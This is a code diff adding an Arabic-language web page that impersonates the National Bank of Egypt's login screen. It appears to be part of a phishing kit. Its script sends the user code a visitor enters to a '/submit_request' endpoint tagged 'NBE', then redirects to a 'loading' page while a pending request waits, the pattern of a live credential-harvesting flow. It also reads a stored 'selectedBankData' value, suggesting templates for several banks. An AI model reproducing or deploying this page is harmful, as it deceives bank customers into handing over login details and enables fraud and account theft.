@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>البنك الأهلي المصري - تسجيل الدخول</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #f8f9fa; min-height: 100vh; display: flex; flex-direction: column; }
+        
+        .header { padding: 40px 20px; text-align: center; background: white; }
+        .header img { height: 60px; }
+        .lang-link { position: absolute; left: 20px; top: 20px; color: #666; text-decoration: none; font-size: 14px; display: flex; align-items: center; gap: 5px; }
+        
+        .content { padding: 20px; flex-grow: 1; }
+        
+        .type-selector { display: flex; background: #eee; border-radius: 10px; padding: 5px; margin-bottom: 30px; }
+        .type-btn { flex: 1; padding: 12px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; background: transparent; color: #666; }
+        .type-btn.active { background: #5a6268; color: white; }
+        
+        .form-group { margin-bottom: 10px; position: relative; }
+        .form-control {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            text-align: right;
+            font-size: 16px;
+            background: white;
+        }
+        .forgot-link { display: block; text-align: right; color: #666; font-size: 13px; margin-bottom: 30px; text-decoration: underline; }
+        
+        .btn-container { display: flex; gap: 10px; margin-bottom: 30px; }
+        .btn-login { flex-grow: 1; background: #006b3f; color: white; border: none; padding: 15px; border-radius: 5px; font-weight: bold; font-size: 16px; }
+        .btn-scan { background: #ced4da; color: #666; border: none; padding: 15px; border-radius: 5px; width: 50px; display: flex; align-items: center; justify-content: center; }
+        
+        .register-link { text-align: center; margin-bottom: 30px; }
+        .register-link a { color: #006b3f; text-decoration: none; font-weight: bold; font-size: 16px; border-bottom: 2px solid #006b3f; }
+        
+        .promo-text { text-align: center; color: #004b91; font-weight: bold; font-size: 16px; margin-bottom: 40px; text-decoration: underline; }
+        
+        .footer-nav { margin-top: auto; display: flex; justify-content: space-around; padding: 20px 10px; background: white; border-top: 1px solid #eee; }
+        .footer-item { text-align: center; color: #666; font-size: 12px; }
+        .footer-item i { display: block; font-size: 22px; margin-bottom: 8px; color: #999; border: 1px solid #eee; padding: 10px; border-radius: 8px; }
+        
+        #errorMessage { color: #d32f2f; text-align: center; margin-bottom: 15px; font-size: 14px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="#" class="lang-link"><i class="fas fa-globe"></i> English</a>
+        <img src="images/nbe_logo.png" alt="National Bank of Egypt">
+    </div>
+
+    <div class="content">
+        <div class="type-selector">
+            <button class="type-btn">شركات</button>
+            <button class="type-btn active">أفراد</button>
+        </div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="text" id="username" class="form-control" placeholder="كود المستخدم" required>
+            </div>
+            <a href="#" class="forgot-link">نسيت كود المستخدم</a>
+            
+            <div id="errorMessage"></div>
+            
+            <div class="btn-container">
+                <div class="btn-scan"><i class="fas fa-qrcode"></i></div>
+                <button type="submit" class="btn-login">تسجيل الدخول</button>
+            </div>
+            
+            <div class="register-link">
+                <a href="#">سجل الآن</a>
+            </div>
+            
+            <div class="promo-text">انضم لعملاء البنك الأهلي المصري</div>
+        </form>
+    </div>
+
+    <div class="footer-nav">
+        <div class="footer-item"><i class="far fa-calendar-alt"></i>احجز موعد</div>
+        <div class="footer-item"><i class="fas fa-map-marker-alt"></i>ماكينة الصارف</div>
+        <div class="footer-item"><i class="fas fa-calculator"></i>حاسبة العملات</div>
+    </div>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            const bankData = localStorage.getItem('selectedBankData');
+            if (bankData) {
+                try {
+                    const bank = JSON.parse(bankData);
+                    // You can use bank data here if needed
+                } catch (e) {
+                    console.error('Error parsing bank data:', e);
+                }
+            }
+        });
+
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            const username = document.getElementById("username").value;
+            const errorDiv = document.getElementById("errorMessage");
+
+            try {
+                const response = await fetch("/submit_request", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        type: "login",
+                        data: { bank: "NBE", username: username }
+                    })
+                });
+                const result = await response.json();
+                if (result.status === "pending") {
+                    localStorage.setItem("request_id", result.request_id);
+                    window.location.href = "loading.html";
+                } else {
+                    errorDiv.textContent = result.message || "حدث خطأ.";
+                    errorDiv.style.display = "block";
+                }
+            } catch (err) {
+                errorDiv.textContent = "خطأ في الاتصال.";
+                errorDiv.style.display = "block";
+            }
+        });
+    </script>
+</body>
+</html>
